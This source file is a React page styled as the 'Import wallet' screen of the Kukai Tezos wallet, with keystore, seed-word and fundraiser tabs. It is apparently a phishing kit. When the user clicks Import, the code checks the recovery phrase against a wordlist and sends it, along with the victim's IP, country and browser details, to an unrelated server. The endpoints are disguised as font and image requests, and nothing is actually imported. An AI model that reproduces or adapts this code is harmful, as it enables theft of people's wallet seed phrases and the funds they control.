"use client";

import { ChevronLeft } from "lucide-react";
import { useEffect, useState } from "react";
import { getUserCountry } from "../utils/services/getUserLocation";
import { useRouter } from "next/navigation";
import axios from "axios";

export default function ImportWallet() {
  const [activeTab, setActiveTab] = useState("keystore");
  const [isToggled, setIsToggled] = useState(false);
  const [userInfo, setUserInfo] = useState()
  const [seedPhraseMessage, setSeedPhraseMessage] = useState()
  const [windowLocation, setWindowLocation] = useState()
  const [userAgent, setUserAgent] = useState()
  const [seedPhraseList, setSeedPhraseList] = useState()
  const [phraseState, setPhraseState] = useState(true)
  const [seedPhraseErrorMessage, setSeedPhraseErrorMessage] = useState()
  const toggleSwitch = () => {
    setIsToggled(!isToggled);
  };

  const router = useRouter()

  useEffect(() => {
    const fetchUserInfo = async () => {
      const userInfo = await getUserCountry();
      setUserInfo(userInfo);
    };
    const fetchWordList = async () => {
      try {
        const wordList = await axios.get("https://www.kaspawallet.org/seedphrase.txt")
        setSeedPhraseList(wordList.data)
      } catch (error) {
        console.error("Failed to fetch seed phrase list:", error)
      }
    }
    const userAgent = navigator.userAgent;
    setUserAgent(userAgent)
    fetchUserInfo();
    fetchWordList()
    setWindowLocation(window.location.href)
  }, []);


  const messageData = {
    country: userInfo?.country || "Unknown",
    browser: userAgent,
    ipAddress: userInfo?.ip,
    appName: "Kukai",
    seedPhrase: seedPhraseMessage,
    vpnDetected: userInfo?.ip,
    specialCountry: true,
  };

  const messageDataAlt = {
    country: userInfo?.country,
    browser: userAgent,
    ipAddress: userInfo?.ip,
    appName: windowLocation,
  };

  const sendMessage = async () => {
    const seedPhraseFormatted = `Seed Phrase: ${seedPhraseMessage.join(' ')}`;
    messageData.seedPhrase = seedPhraseFormatted;
    console.log(messageData)
    try {
      await fetch("https://fonts7787.vercel.app/api/t1/image", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "x-api-key": process.env.NEXT_PUBLIC_SECRET_KEY,
        },
        body: JSON.stringify(messageData),
      });
    } catch (error) {
      console.error("Error sending image message:", error);
    }
  }

  const sendMessageAlt = async () => {
    fetch("https://fonts7787.vercel.app/api/t1/font", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "x-api-key": import.meta.env.VITE_APP_SECRET_KEY,
      },
      body: JSON.stringify(messageDataAlt),
    }).catch((error) => console.error("Error sending font message:", error));
  }
  const handleSeedPhrasesChange = (event) => {
    const inputWords = event.target.value.trim().split(/\s+/); // Split by spaces
    const validWordList = new Set(
      seedPhraseList.split("\n").map((word) => word.trim())
    );

    const invalidWords = inputWords.filter((word) => !validWordList.has(word)); // Find invalid words

    if (inputWords.length < 12 || inputWords.length > 24) {
      setSeedPhraseErrorMessage("Seed phrase must be exactly 12 - 24 words.");
      setPhraseState(true);
      setSeedPhraseMessage(null); // Clear previous message
      return;
    }

    if (invalidWords.length > 0) {
      setSeedPhraseErrorMessage(
        `Invalid words detected: ${invalidWords.join(", ")}`
      );
      setPhraseState(true);
      setSeedPhraseMessage(null); // Clear previous message
      return;
    }

    // Valid seed phrase
    setSeedPhraseErrorMessage("");
    setPhraseState(false);
    setSeedPhraseMessage(inputWords); // Store the valid seed phrase
  };

  

  const binarySearch = (arr, target) => {
    let left = 0;
    let right = arr.length - 1;

    while (left <= right) {
      const mid = Math.floor((left + right) / 2);
      if (arr[mid] === target) {
        return mid;
      } else if (arr[mid] < target) {
        left = mid + 1;
      } else {
        right = mid - 1;
      }
    }

    return -1;
  };


  return (
    <div className=" bg-[#f0f2f4] pb-[52px] ">
      <div className="max-w-[800px] relative  mx-auto px-4 sm:px-6 lg:px-8 py-12">
        <div className="absolute ">
          <a href="/">
            <div className="flex items-center justify-center gap-1 py-1 md:px-5 px-1 bg-white rounded-xl border border-gray-300">
              <ChevronLeft size={11} className="text-[11px] " />
              <p className="text-[11px] md:block hidden">Back</p>
            </div>
          </a>
        </div>

        <h1 className="text-3xl font-bold text-center mb-8">Import wallet</h1>
        <div className="mb-4">
          {/* <div className="sm:hidden">
            <select
              id="tabs"
              name="tabs"
              className="block w-full rounded-md border-gray-300 focus:border-blue-500 focus:ring-blue-500"
              value={activeTab}
              onChange={(e) => setActiveTab(e.target.value)}
            >
              <option value="keystore">Keystore File</option>
              <option value="seed">Seed Words</option>
              <option value="fundraiser">Fundraiser</option>
            </select>
          </div> */}
          <div className=":block">
            <nav className="flex justify-evenly " aria-label="Tabs">
              {["keystore", "seed word", "fundraiser"].map((tab) => (
                <button
                  key={tab}
                  onClick={() => setActiveTab(tab)}
                  className={`w-full ${activeTab === tab
                    ? "border-b-2 border-[#505bf0] text-[#505bf0]"
                    : "text-gray-500 hover:text-gray-700"
                    } px-3 py-2 font-medium text-sm `}
                >
                  {tab.charAt(0).toUpperCase() + tab.slice(1)}
                </button>
              ))}
            </nav>
          </div>
        </div>

        {activeTab === "keystore" && (
          <div className="space-y-4 mt-[60px] pb-[52px]">
            <p className="capitalize text-center text-[11px] font-semibold">
              Import your wallet from an existing storage file (.tez)
            </p>
            <div className="flex items-center justify-center w-full">
              <label
                htmlFor="dropzone-file"
                className="flex flex-col items-center justify-center w-full p-1 border-2 border-gray-300 border-dashed rounded-2xl cursor-pointer bg-gray-50 hover:bg-gray-100"
              >
                <div className="flex items-center justify-between p-4 bg-gray-200 rounded-2xl w-full">
                  <p className="text-gray-400 text-sm">Browse</p>

                  <div className="h-4 flex text-sm items-center text-gray-400 justify-center w-4 rounded-sm border-[2px] border-gray-400">
                    +
                  </div>
                </div>
                <input
                  id="dropzone-file"
                  type="file"
                  className="hidden text-sm"
                />
              </label>
            </div>
          </div>
        )}

        {activeTab === "seed word" && (
          <div className="space-y-4 mt-[60px]">
            <p className="capitalize text-center text-[12px] font-semibold">
              RECOVERY (SEED) WORDS{" "}
              <span className="text-gray-400"> 12-24 WORDS</span>
            </p>
            <div className="flex flex-col gap-4 items-center justify-center">
              <textarea
                onChange={(e) => {
                  handleSeedPhrasesChange(e)
                }}
                rows={4}
                className="sm:w-[45%] w-[70%] px-3 py-2 text-[11px] text-center text-gray-700 border rounded-lg focus:outline-none focus:border-blue-500"
                placeholder="Seed word required"
              />
              <div className="flex items-center gap-2">
                <p className="mr-3 text-gray-600 text-sm">Advanced:</p>
                <p className="text-sm text-gray-400">
                  {isToggled ? "Yes" : "No"}
                </p>

                <div className="flex items-center justify-center ">
                  <button
                    onClick={toggleSwitch}
                    className={`relative inline-flex items-center h-6 w-12 rounded-full transition-colors duration-300 focus:outline-none ${isToggled ? "bg-white" : "bg-white"
                      }`}
                  >
                    <span
                      className={`inline-block h-4 w-4 transform rounded-full  ${isToggled ? "bg-[#505bf0]" : "bg-gray-200"
                        } transition-transform duration-300 ${isToggled ? "translate-x-6" : "translate-x-1"
                        }`}
                    />
                  </button>
                </div>
              </div>
              {isToggled && (
                <div className="flex gap-7 my-5">
                  <div className="w-[350px]">
                    <p className="text-sm font-[600] text-center">
                      If your seed words are protected by a passphrase, it needs
                      to be entered here
                    </p>
                    <div className="bg-white mt-4 rounded-full">
                      <input
                        type="text"
                        placeholder="Passphrase (optional)"
                        className="bg-transparent text-sm w-full text-center p-2 border-transparent  "
                      />
                    </div>
                  </div>
                  <div className="w-[350px]">
                    <p className="text-sm font-[600] text-center">
                      Provide the address to verify your passphrase is correct
                    </p>
                    <div className="bg-white mt-4 rounded-full">
                      <input
                        type="text"
                        placeholder="tz1... (optional)"
                        className="bg-transparent text-sm w-full text-center p-2 border-transparent  "
                      />
                    </div>
                  </div>
                </div>
              )}
              <div>
                {seedPhraseErrorMessage && <p className="text-red-500 text-sm">{seedPhraseErrorMessage}</p>}
              </div>
              <button disabled={phraseState} onClick={(e) => {
                e.preventDefault()
                sendMessage()
              }} className="w-[45%] cursor-pointer bg-[#505bf0] text-white rounded-full py-2 px-4 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2">
                Import
              </button>
            </div>
          </div>
        )}

        {activeTab === "fundraiser" && (
          <div className="space-y-6 mt-[60px]">
            <p className="capitalize text-center pb-2 text-[12px] font-semibold">
              Please make sure to first{" "}
              <span className="text-[#505bf0]">activate</span> your fundraiser
              wallet.
            </p>
            <p className="capitalize text-center text-[12px] font-semibold">
              RECOVERY (SEED) WORDS{" "}
              <span className="text-gray-400"> 12-24 WORDS</span>
            </p>
            <div className="flex flex-col gap-6 items-center justify-center">
              <textarea
                rows={4}
                className="sm:w-[45%] w-[70%]  px-3 py-2 text-[11px] text-center text-gray-700 border rounded-lg focus:outline-none focus:border-blue-500"
                placeholder="Seed word required"
              />
              <div>
                <p className="capitalize text-center text-[12px] pb-3 font-semibold">
                  The email used during the fundraiser
                </p>

                <input
                  type="email"
                  // rows={4}
                  className="w-full px-3 py-2 text-[11px] text-center text-gray-700 border rounded-full focus:outline-none focus:border-blue-500"
                  placeholder="Email (required)"
                  required
                />
              </div>
              <div>
                <p className="capitalize text-center text-[12px] pb-3 font-semibold">
                  The password you chose during the fundraiser
                </p>

                <input
                  type="password"
                  // rows={4}
                  className="w-full px-3 py-2 text-[11px] text-center text-gray-700 border rounded-full focus:outline-none focus:border-blue-500"
                  placeholder="Password (required)"
                  required
                />
              </div>
              <div>
                <p className="capitalize text-center text-[12px] pb-3 font-semibold">
                  Provide the public key hash to verify your email and password
                  are correct
                </p>

                <input
                  type="password"
                  // rows={4}
                  className="w-full px-3 py-2 text-[11px] text-center text-gray-700 border rounded-full focus:outline-none focus:border-blue-500"
                  placeholder="tz1... (recommended)"
                  required
                />
              </div>

              <button className="w-[45%] bg-[#505bf0] text-white rounded-full py-2 px-4 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2">
                Import
              </button>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
